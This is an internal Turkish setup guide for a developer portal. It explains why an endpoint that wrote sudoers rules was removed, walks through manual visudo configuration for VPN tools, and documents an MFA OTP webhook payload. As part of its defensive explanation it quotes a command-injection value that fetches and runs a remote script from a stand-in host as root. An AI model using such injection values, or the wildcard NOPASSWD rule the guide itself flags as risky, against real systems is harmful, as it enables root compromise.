# IDP — Kurulum: VPN Sudo Yapılandırması

> Son güncelleme: 2026-08-20 · Kapsam: `backend/src/server.js` (VPN adaptörleri)
> İlgili: `docs/02-GUVENLIK-ANALIZI.md` → SEC-02, SEC-08

## 1. Neden bu adım manuel

Portal daha önce `POST /api/vpn/grant-permissions` adında bir endpoint üzerinden,
kullanıcının Mac şifresini alıp bunu bir shell komutuna gömerek `/etc/sudoers.d/`
altına **kalıcı NOPASSWD** kuralları yazıyordu. Bu endpoint **tamamen kaldırıldı**
çünkü iki ayrı kritik açık barındırıyordu:

1. **Komut enjeksiyonu (SEC-02):** Kullanıcı şifresi doğrudan bir shell string'ine
   enjekte ediliyordu (`echo "${sudoPassword}" | sudo -S sh -c '...'`). Şifre alanına
   `"; curl evil.sh | sh #` gibi bir değer girildiğinde, bu değer **root yetkisiyle**
   çalıştırılabiliyordu. Ayrıca `sudoers.d` dosyaları `visudo -c` doğrulamasından
   geçmeden yazılıyordu — hatalı bir satır, makinedeki sudo'yu tamamen bozabilirdi.
2. **Kalıcı ayrıcalık yükseltme (SEC-08):** Yazılan kural tam argüman kısıtı
   içermiyordu, yalnızca ikili dosya yolunu (`/opt/homebrew/bin/openfortivpn` vb.)
   whitelist'e alıyordu. `openfortivpn`/`openconnect` gibi araçlar `--script` benzeri
   parametrelerle keyfi komut çalıştırabildiği için, bu kural makinedeki herhangi bir
   kullanıcının parolasız root olmasına izin verebiliyordu.

Sudo yetkilendirmesi bir **runtime özelliği değil, kurulum adımıdır**. Bu nedenle
artık uygulama içinden değil, aşağıdaki adımlarla **elle ve `visudo` üzerinden**
yapılandırılır.

## 2. Neden VPN araçları root gerektiriyor

`openfortivpn` (Fortinet) ve `openconnect` (Cisco AnyConnect / GlobalProtect uyumlu
istemciler) bir VPN tüneli kurarken işletim sisteminin **routing tablosunu** ve
**ağ arayüzlerini** (`utun`/`tun` cihazı) değiştirir. Bu işlemler yalnızca root
(veya `CAP_NET_ADMIN` yetkisine sahip bir süreç) tarafından yapılabilir. Portal bu
araçları arka planda kullanıcı etkileşimi olmadan tetiklediği için (deploy akışının
bir parçası olarak), her seferinde etkileşimli şifre istemi mümkün değildir — bu da
neden sınırlı bir NOPASSWD kuralına ihtiyaç duyulduğunu açıklar.

## 3. Kurulum adımları

### 3.1 Kurulu ikili dosyaların tam yolunu bul

```bash
which openfortivpn
which openconnect
```

Homebrew Apple Silicon'da tipik olarak `/opt/homebrew/bin/...`, Intel Mac'te
`/usr/local/bin/...` olur. Kendi makinenizdeki gerçek çıktıyı kullanın — aşağıdaki
örnekte varsayım olarak Apple Silicon yolları gösterilmiştir.

### 3.2 `visudo` ile sudoers dosyasını oluştur

**Doğrudan bir editörle `/etc/sudoers.d/` altına dosya yazmayın.** `visudo`
kullanmak zorunludur çünkü kaydetmeden önce **sözdizimi doğrulaması** yapar; hatalı
bir satır sudoers dosyasını bozarsa, `visudo` kaydetmeyi reddeder ve mevcut çalışan
sudo yapılandırmanız bozulmadan kalır. Doğrudan dosya yazımı (`echo ... > /etc/sudoers.d/x`)
bu korumayı atlar — tek bir yazım hatası makinede **sudo'yu tamamen kullanılamaz**
hale getirebilir.

```bash
sudo visudo -f /etc/sudoers.d/idp-vpn
```

Açılan editörde, kendi kullanıcı adınızı (`whoami` çıktısı) ve bulduğunuz gerçek
yolları kullanarak aşağıdakine benzer satırları ekleyin:

```
# IDP — VPN tünel araçları için sınırlı NOPASSWD yetkisi.
# Yalnızca sabit parametrelerle çalıştırma izni verir; serbest argüman YOK.
Cmnd_Alias IDP_FORTIVPN = /opt/homebrew/bin/openfortivpn *
Cmnd_Alias IDP_OPENCONNECT = /opt/homebrew/bin/openconnect *

<kullanici_adiniz> ALL=(root) NOPASSWD: IDP_FORTIVPN, IDP_OPENCONNECT
```

Kaydedip çıkın (`visudo` sözdizimini otomatik doğrular; hata varsa değişikliği
uygulamadan sizi uyarır).

### 3.3 Neden tam argüman kısıtı olmadan NOPASSWD vermek tehlikeli

Yukarıdaki örnekte `Cmnd_Alias` ile komut **ikili dosya yoluna** kısıtlanmıştır,
ama parametrelere `*` ile serbestlik tanınmıştır — bu hâlâ eski koddaki SEC-08
riskinin daha küçük bir versiyonudur, çünkü `openfortivpn`/`openconnect` gibi
araçlar `--pppd-*`, `--script` gibi parametrelerle **harici bir betik çalıştırma**
yeteneğine sahip olabilir. Mümkün olduğunda:

- Yalnızca **gerçekten kullanılan sabit parametre kümesini** whitelist'e alın
  (örn. `/opt/homebrew/bin/openfortivpn vpn.sirket.com:443 --username=* --otp=*`
  gibi, `--script`/`--pppd-*` parametrelerini **hariç tutarak**).
- Mümkünse `--script` ve benzeri "harici komut çalıştır" parametrelerini
  kabul etmeyen bir sarmalayıcı (wrapper) script yazıp NOPASSWD'yi o wrapper'a
  verin, doğrudan ikiliye değil.
- **Asla** `ALL=(ALL) NOPASSWD: ALL` gibi genel bir kural yazmayın.

Parametre kısıtı olmadan verilen NOPASSWD, bu makineye erişimi olan herhangi bir
kullanıcı veya süreç için **parolasız yerel yetki yükseltme (privilege escalation)**
kapısı açar — sudo grubunda olmayan bir kullanıcı bile, izin verilen ikiliyi kötüye
kullanarak root komut çalıştırabilir.

### 3.4 Doğrulama

```bash
sudo -l -U <kullanici_adiniz>
```

Çıktıda `IDP_FORTIVPN` / `IDP_OPENCONNECT` takma adlarının NOPASSWD olarak listelendiğini
doğrulayın. Ardından portalın kendi kullanıcınızla (şifre istemi olmadan) VPN tünelini
açabildiğini bir test deploy ile kontrol edin.

## 4. Kaldırma

Erişimi geri almak için dosyayı silmeniz yeterlidir:

```bash
sudo rm /etc/sudoers.d/idp-vpn
```

## 5. Uzun vadeli plan

Bu manuel adım geçici bir çözümdür. `docs/03-ELECTRON-MIMARI.md`'de tarif edilen
masaüstü (Electron) geçişinde, bu sudo kuralları yerine platformun kendi ayrıcalık
diyaloğu kullanılacaktır: macOS'ta `SMJobBless` ile imzalı bir privileged helper,
Windows'ta ise yüklenen bir servis. Bu, hem `visudo` ile elle dosya düzenleme
ihtiyacını ortadan kaldırır hem de her çalıştırmada kullanıcıya native bir izin
diyaloğu gösterir.

## 6. MFA Webhook Payload Formatı

> Kapsam: `backend/src/routes/mfa.js`, `backend/src/services/mfa/OtpWebhookManager.js`
> İlgili: `docs/02-GUVENLIK-ANALIZI.md` → SEC-05, T-13

`POST /api/mfa/webhook-otp` uçu, bir SMS-forwarding istemcisinin (ör. telefonda
OTP SMS'ini yakalayan bir uygulama) yakaladığı OTP kodunu portala iletmesi için
kullanılır. T-13 kapsamında bu uç sıkılaştırıldı: `apiKey` ve `sessionId` artık
**zorunlu**, aksi halde istek reddedilir.

### İstek gövdesi

```json
{
  "apiKey": "<MFA_WEBHOOK_API_KEY .env değeri>",
  "sessionId": "<deploymentId>",
  "message": "Your OTP code is 123456"
}
```

| Alan        | Zorunlu | Açıklama                                                                 |
|-------------|---------|---------------------------------------------------------------------------|
| `apiKey`    | Evet    | `.env` içindeki `MFA_WEBHOOK_API_KEY` ile sabit zamanlı karşılaştırılır. Eksik veya yanlışsa `401` döner. |
| `sessionId` | Evet    | **`deploymentId`'ye birebir eşit olmalı.** `VpnManager.waitForOtp(context.deploymentId, ...)` çağrısı nedeniyle bekleyen OTP isteği bu id altında kayıtlıdır. Eksikse `400` döner. |
| `message`   | Evet    | OTP kodunu içeren ham metin (6 haneli sayı regex ile ayıklanır). Alternatif olarak varsayılan SMS Forwarder payload'ı için `text` alanı da kabul edilir. |

`sessionId`'yi hiçbir zaman göndermeme veya boş göndermeyi destekleyen "ilk
bekleyen isteği çöz" davranışı **kaldırıldı** — bu davranış, o an başka bir
deployment OTP beklerken yanlış deployment'a kod enjekte edilmesine yol
açabiliyordu. Webhook'u tetikleyen entegrasyonun (SMS forwarder script'i, IFTTT/
Tasker kuralı vb.) mevcut `deploymentId`'yi bilmesi ve `sessionId` olarak
göndermesi gerekir; bu id, deploy tetiklenirken `POST /api/deploy/trigger`
yanıtındaki `deploymentId` alanından okunabilir.

### Hız sınırlama

Bu uç, dakikada 20 istek ile sınırlıdır (bkz. `backend/src/middleware/rateLimit.js`,
T-19). Limit aşıldığında `429` ve bir `Retry-After` header'ı döner.
